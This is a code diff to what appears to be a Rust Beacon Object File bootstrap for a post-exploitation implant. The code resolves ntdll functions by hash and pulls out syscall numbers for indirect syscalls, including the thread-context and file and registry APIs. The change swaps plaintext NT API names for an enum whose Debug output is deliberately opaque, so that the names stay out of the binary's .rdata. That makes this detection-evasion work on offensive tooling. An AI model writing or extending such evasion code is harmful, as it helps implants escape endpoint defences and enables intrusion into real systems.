@@ -89,10 +89,31 @@ pub unsafe extern "system" fn indirect_syscall11(
     }
 }
 
+/// Discriminant for `Error::StubNotFound` — avoids plaintext NT API names
+/// in `.rdata` of the linked BOF. `Debug` is implemented manually to suppress
+/// variant-name string literals that the derive macro would otherwise embed.
+pub enum BootstrapExport {
+    NtGetContextThread,
+    NtSetContextThread,
+    NtCreateFile,
+    NtWriteFile,
+    NtClose,
+    NtQueryDirectoryFile,
+    NtOpenKey,
+    NtQueryValueKey,
+}
+
+impl core::fmt::Debug for BootstrapExport {
+    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
+        // Intentionally opaque — variant names must not appear in .rdata.
+        f.write_str("export")
+    }
+}
+
 #[derive(Debug)]
 pub enum Error {
     NtdllNotFound,
-    StubNotFound(&'static str),
+    StubNotFound(BootstrapExport),
     GadgetNotFound,
 }
 
@@ -128,14 +149,14 @@ impl Bootstrap {
         bdbg!(b"[bs] resolve get_ctx\n");
         let get_ctx = unsafe {
             resolve_export(ntdll, hash!("NtGetContextThread"))
-                .ok_or(Error::StubNotFound("NtGetContextThread"))? as *const u8
+                .ok_or(Error::StubNotFound(BootstrapExport::NtGetContextThread))? as *const u8
         };
         bdbg!(b"[bs] get_ctx ok\n");
 
         bdbg!(b"[bs] resolve set_ctx\n");
         let set_ctx = unsafe {
             resolve_export(ntdll, hash!("NtSetContextThread"))
-                .ok_or(Error::StubNotFound("NtSetContextThread"))? as *const u8
+                .ok_or(Error::StubNotFound(BootstrapExport::NtSetContextThread))? as *const u8
         };
         bdbg!(b"[bs] set_ctx ok\n");
 
@@ -155,27 +176,27 @@ impl Bootstrap {
         bdbg!(b"[bs] resolve nt file/reg ssns\n");
         let create_file = unsafe {
             resolve_export(ntdll, hash!("NtCreateFile"))
-                .ok_or(Error::StubNotFound("NtCreateFile"))? as *const u8
+                .ok_or(Error::StubNotFound(BootstrapExport::NtCreateFile))? as *const u8
         };
         let write_file = unsafe {
             resolve_export(ntdll, hash!("NtWriteFile"))
-                .ok_or(Error::StubNotFound("NtWriteFile"))? as *const u8
+                .ok_or(Error::StubNotFound(BootstrapExport::NtWriteFile))? as *const u8
         };
         let close = unsafe {
             resolve_export(ntdll, hash!("NtClose"))
-                .ok_or(Error::StubNotFound("NtClose"))? as *const u8
+                .ok_or(Error::StubNotFound(BootstrapExport::NtClose))? as *const u8
         };
         let query_dir_file = unsafe {
             resolve_export(ntdll, hash!("NtQueryDirectoryFile"))
-                .ok_or(Error::StubNotFound("NtQueryDirectoryFile"))? as *const u8
+                .ok_or(Error::StubNotFound(BootstrapExport::NtQueryDirectoryFile))? as *const u8
         };
         let open_key = unsafe {
             resolve_export(ntdll, hash!("NtOpenKey"))
-                .ok_or(Error::StubNotFound("NtOpenKey"))? as *const u8
+                .ok_or(Error::StubNotFound(BootstrapExport::NtOpenKey))? as *const u8
         };
         let query_value_key = unsafe {
             resolve_export(ntdll, hash!("NtQueryValueKey"))
-                .ok_or(Error::StubNotFound("NtQueryValueKey"))? as *const u8
+                .ok_or(Error::StubNotFound(BootstrapExport::NtQueryValueKey))? as *const u8
         };
         let create_file_ssn      = unsafe { extract_ssn(create_file).unwrap_or(0) };
         let write_file_ssn       = unsafe { extract_ssn(write_file).unwrap_or(0) };
